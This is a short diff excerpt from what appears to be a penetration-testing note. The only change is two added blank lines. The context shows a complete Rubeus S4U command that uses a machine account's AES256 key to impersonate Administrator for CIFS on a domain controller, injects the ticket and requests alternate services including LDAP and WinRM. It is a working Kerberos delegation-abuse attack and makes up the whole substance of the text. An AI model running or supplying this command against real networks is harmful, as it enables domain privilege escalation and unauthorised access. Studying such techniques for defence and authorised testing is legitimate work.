@@ -15,3 +15,5 @@ updated_at: '2023-04-06T03:56:07.815485+00:00'
 ```bash
 .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
 ```
+
+
